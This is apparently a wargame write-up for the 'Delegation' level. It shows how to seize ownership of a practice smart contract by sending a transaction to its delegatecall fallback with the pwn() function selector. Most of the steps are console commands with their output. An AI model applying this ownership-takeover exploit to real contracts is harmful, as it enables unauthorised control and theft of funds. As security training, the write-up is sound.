# Level 6: Delegation

### Wargame
The goal of this level is for you to claim ownership of the instance you are given.

### Key Insights
* What is the way to call the non-payable fallback() of Delegation?
* What is the way to call the function pwn() of Delegate?

### Attack Steps
1. Inspect Initial Contract Owner:
    Before executing the attack, display the current owner of the target contract. This is typically done by calling a public owner() function on the contract instance. You will observe that the owner is initially not your address.
    ```bash
    > await contract.owner()
    '0x73379d8B82Fda494ee59555f333DF7D44483fD58'

    > player
    '0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf'
    ```

2. Trigger the Vulnerable Fallback:
    Now, to exploit the contract and trigger the vulnerable fallback function, send a transaction to the target contract's address. This transaction must have zero ETH (value: 0) and includepwn() of Delegate function selector in its calldata. This will cause the fallback to execute the malicious logic intended by the attacker.
    ```bash
    > await web3.eth.sendTransaction({from: player, to: instance, data: web3.eth.abi.encodeFunctionSignature("pwn()"), value: "0x0"})

    {blockHash: '0xe534ebb8580d1b94eb120d360b83dcdf61dc49910dde9610eaef14936e073f0e', blockNumber: 8791481, contractAddress: null, cumulativeGasUsed: 221377, effectiveGasPrice: 2500964642, …}
    ```

3. Verify New Contract Ownership:
    After the transaction is confirmed, display the owner of the target contract again. You will now observe that the contract's owner has been successfully changed to your address, demonstrating the success of the attack.
    ```bash
    > await contract.owner()
    '0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf'
    ```

